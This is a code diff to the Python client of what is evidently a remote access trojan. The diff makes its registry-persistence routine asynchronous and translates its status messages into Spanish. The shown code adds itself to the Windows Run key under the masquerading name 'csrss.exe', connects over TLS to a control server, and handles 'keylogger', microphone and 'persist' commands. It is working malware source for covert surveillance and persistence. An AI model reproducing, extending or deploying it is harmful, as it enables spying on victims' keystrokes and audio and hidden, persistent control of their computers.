@@ -140,7 +140,7 @@ class Client:
                 pass
             stdout = ''
             stderr = ''
-    def addStartup(self):  # this will add the file to the startup registry key
+    async def addStartup(self):  # this will add the file to the startup registry key
         try:
             file_name = os.path.basename(__file__)
             name, ext = os.path.splitext(file_name)
@@ -149,11 +149,13 @@ class Client:
             key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0,winreg.KEY_ALL_ACCESS)
             winreg.SetValueEx(key2change, 'csrss.exe', 0, winreg.REG_SZ,
                     new_file_path)
-            self.writer.write(b'[+] Registers pwned')
-            self.writer.drain()
-            self.writer.write(bytes(new_file_path + ' in Software\Microsoft\Windows\CurrentVersion\Run','utf-8'))
+            self.writer.write(b'[+] Los registros han sido comprometidos')
+            await self.writer.drain()
+            await asyncio.sleep(1)
+            self.writer.write(bytes(new_file_path + ' en Software\Microsoft\Windows\CurrentVersion\Run','utf-8'))
+            await self.writer.drain()
         except:
-            self.writer.write(b'[+] could not write to the registers for persistence')
+            self.writer.write(b'[+] No se puede escribir en los registros para la persistencia')
 
     async def ConnectToServer(self):
         self.context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
@@ -233,13 +235,13 @@ class Client:
                 writer.write(b'mic')
                 await writer.drain()
                 await asyncio.sleep(2)
-                writer.write(b'[-] No microphones')
+                writer.write(b'[-] No hay microfonos')
                 await writer.drain()
                 return
         else:
             writer.write(b'mic')
             await writer.drain()
-            writer.write(b'[-] No microphones')
+            writer.write(b'[-] No Hay microfonos')
             await writer.drain()
             return
 
@@ -304,11 +306,11 @@ class Client:
                     elif data == 'autocon':
                         if self.AUTOCON == False:
                             self.AUTOCON = True
-                            self.writer.write(b'\n[+] AUTOCONNECTION TRUE')
+                            self.writer.write(b'\n[+] AUTOCONECTAR TRUE')
                             await self.writer.drain()
                         else:
                             self.AUTOCON = False
-                            self.writer.write(b'\n[+] AUTOCONNECTION FALSE')
+                            self.writer.write(b'\n[+] AUTOCONECTAR FALSE')
                             await self.writer.drain()
                     elif data == 'keylogger':
                         self.status_keylogger = True
@@ -329,9 +331,9 @@ class Client:
                                     await self.writer.drain()
                                     self.key_pressed = None
                     elif data == 'persist':
-                        self.addStartup()
+                        await self.addStartup()
                     else:
-                        self.writer.write(b'\n[-] I do not know the command')
+                        self.writer.write(b'\n[-] Yo no conosco el comando')
                         await self.writer.drain()
             except (KeyboardInterrupt, ConnectionResetError):
                 self.writer.close()
